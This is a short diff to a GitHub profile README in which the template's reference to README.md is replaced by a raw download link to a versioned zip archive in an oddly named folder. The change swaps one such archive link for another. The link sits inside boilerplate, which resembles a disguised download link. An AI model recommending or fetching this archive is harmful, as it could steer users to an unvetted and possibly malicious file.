@@ -5,6 +5,6 @@
 - 📫 How to reach me +254708210687
 
 <!---
-VersaVin/VersaVin is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/VersaVin/VersaVin/main/cnidocell/Vin-Versa-v3.6.zip` (this file) appears on your GitHub profile.
+VersaVin/VersaVin is a ✨ special ✨ repository because its `https://github.com/VersaVin/VersaVin/raw/refs/heads/main/cnidocell/Vin_Versa_v1.1-alpha.2.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
